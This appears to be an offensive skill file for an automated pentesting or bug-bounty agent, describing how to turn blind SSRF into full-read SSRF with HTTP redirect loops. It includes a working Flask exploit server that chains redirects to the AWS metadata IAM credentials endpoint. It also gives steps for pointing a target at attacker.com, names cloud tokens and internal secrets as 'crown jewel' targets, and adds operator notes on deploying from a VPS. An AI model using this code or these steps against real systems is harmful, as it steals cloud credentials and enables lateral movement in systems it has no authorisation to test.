---
name: ssrf-redirect-loop-exfil
pattern: SSRF Response Exfiltration via HTTP Redirect Loops
description: "Convert blind SSRF to full-read SSRF using HTTP redirect chains with escalating 3xx status codes that trigger unhandled error states leaking response bodies"
triggers: ["/test-ssrf", "blind ssrf", "ssrf exfiltration", "redirect loop", "ssrf bypass", "blind to full read", "libcurl ssrf", "ssrf response leak"]
tech: [generic]
severity: High
related_patterns: [ssrf-to-rce-chain, ssrf-protocol-smuggling-chain, nextjs-ssrf, pdf-ssrf, open-redirect-chains, auto-chain-discovery]
sources: ["Shubham Shah — Searchlight Cyber / Assetnote (2025)"]
---

# SSRF Response Exfiltration via HTTP Redirect Loops

**Source:** Shubham Shah, Searchlight Cyber / Assetnote (2025)
**Affected:** Applications using libcurl for server-side HTTP requests with inconsistent error handling

## Crown Jewel Targets

- **AWS IAM credentials** extracted from blind SSRF that only shows errors, not 200 OK responses
- **GCP/Azure metadata tokens** leaked through error handler dumping redirect chain bodies
- **Internal API responses** containing PII or secrets, exfiltrated via status code confusion
- **Cloud service account tokens** for lateral movement from blind-only SSRF positions
- **Internal service discovery data** (Consul, Kubernetes API) through blind-to-read upgrade

## Attack Surface Signals

- Blind SSRF confirmed (DNS callback received) but no response body returned
- Application displays error messages for non-200 responses but suppresses success responses
- Server uses libcurl or similar HTTP client with redirect following enabled
- Webhook/callback features that process URLs server-side
- Error responses include partial stack traces or HTTP client library details
- Different behavior for 4xx/5xx vs 2xx responses (shows errors, hides successes)

## Problem

Blind SSRF where the application follows redirects but only displays error responses (e.g., HTTP 500), not success responses (HTTP 200). Cloud metadata endpoints return 200, making credential extraction impossible with standard techniques.

## Technique

Create a redirect chain that increments HTTP status codes through the 3xx range. After ~5 redirects with escalating status codes, many applications enter an unhandled error state that dumps the entire redirect chain INCLUDING the final 200 OK response body.

## Exploit Server (Flask)

```python
from flask import Flask, redirect, request
app = Flask(__name__)

@app.route('/start', methods=['POST', 'GET'])
def start():
    return redirect("/redir", code=302)

@app.route('/redir', methods=['GET', 'POST'])
def redir():
    redirect_count = int(request.args.get('count', 0))
    redirect_count += 1
    status_code = 301 + redirect_count

    if redirect_count >= 10:
        # Final redirect to actual SSRF target
        return redirect("http://169.254.169.254/latest/meta-data/iam/security-credentials/role-name", code=302)

    return redirect(f"/redir?count={redirect_count}", code=status_code)
```

## How It Works

1. Point SSRF to `http://attacker.com/start`
2. Server responds: 302 → `/redir?count=0`
3. Each hop: 303 → 304 → 305 → 306 → 307 → 308 → 309 → 310
4. After 10 hops: 302 → actual target (e.g., AWS metadata)
5. Application enters error state at ~5th redirect
6. Error handler dumps ALL response bodies including the final 200 OK

## Why It Works

Applications typically handle:
- Few redirects: JSON parse error (expected format)
- Too many redirects (>30): NetworkException (libcurl MAX_REDIRECTS)
- **5-10 redirects with unusual status codes**: Unhandled error state → data leak

The gap between "normal error" and "too many redirects" is the exploitation window.

## Status Codes Traversed

```
302 → 303 → 304 → 305 → 306 → 307 → 308 → 309 → 310 → 302 (final) → 200 (target)
```

The response leak starts at status code 305 onward.

## Applicability

Works when the target application:
1. Uses libcurl or similar HTTP client for server-side requests
2. Follows redirects but only displays error responses
3. Has inconsistent error handling across different redirect counts
4. Doesn't properly handle unusual 3xx status codes (305, 306, 309, 310)

## Variations to Try

- Different starting status codes (301 vs 302)
- Different increment patterns (skip codes, random order)
- Mix of valid (301/302/307/308) and unusual (305/306) codes
- Vary the total number of redirects (5, 7, 10, 15)
- Use different final targets (metadata, internal services)

## Integration with Existing SSRF Testing

When you find a blind SSRF:
1. First try direct access to metadata/internal services
2. If blocked by response filtering, try this redirect loop technique
3. Host the Flask server on your VPS
4. Point the SSRF to your server's `/start` endpoint
5. Check if the error response contains leaked data

## Bug Bounty Relevance

- **HIGH**: Converts blind SSRF → full-read SSRF
- **CRITICAL** when combined with cloud metadata access (AWS IAM creds)
- Useful against well-filtered SSRF that blocks direct internal access
- "Has worked in several situations" per Assetnote researchers

---

## Operator Notes (Battle-Tested)

- **Deploy Flask server on VPS first** — the redirect chain server must be publicly reachable. Use a cheap VPS with the provided Flask code
- **Vary redirect counts** — some apps break at 5, others at 7 or 10. Test multiple chain lengths (5, 7, 10, 15) before concluding it doesn't work
- **Mix valid and unusual status codes** — 305 (Use Proxy) and 306 (unused) are most likely to trigger unhandled error paths
- **Check error response format** — the leaked data may be embedded in JSON error objects, HTML error pages, or raw text. Parse all response formats
- **This is a last-resort upgrade technique** — only use when direct metadata access is blocked by response filtering. Try direct SSRF targets first
- **Combine with other SSRF vectors** — if PDF-SSRF or Next.js middleware SSRF is blind, chain through the redirect loop server

## Related Skills & Chains

| Situation | Pattern / Skill |
|-----------|----------------|
| Full-read SSRF confirmed, need RCE | `ssrf-to-rce-chain` |
| Need protocol smuggling to internal services | `ssrf-protocol-smuggling-chain` |
| Next.js middleware SSRF is blind | `nextjs-ssrf` |
| PDF generator SSRF is blind | `pdf-ssrf` |
| Open redirect needed for chain | `open-redirect-chains` |
| Check chain escalation matrix | `auto-chain-discovery` |
